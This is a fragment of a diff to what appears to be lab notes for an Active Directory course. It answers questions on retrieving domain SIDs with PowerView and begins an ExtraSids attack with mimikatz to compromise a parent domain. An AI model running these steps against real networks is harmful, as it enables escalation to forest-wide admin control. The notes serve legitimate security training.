@@ -18,11 +18,11 @@ Q1: What is the SID of the child domain?
 
 Import-Module .\PowerView.ps1
 Get-DomainSID
-
+---
 Q2: What is the SID of the Enterprise Admins group in the root domain?
 
 Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
-
+---
 Q3: Perform the ExtraSids attack to compromise the parent domain. Submit the contents of the flag.txt file located in the c:\ExtraSids folder on the ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL domain controller in the parent domain.
 
 .\mimikatz.exe
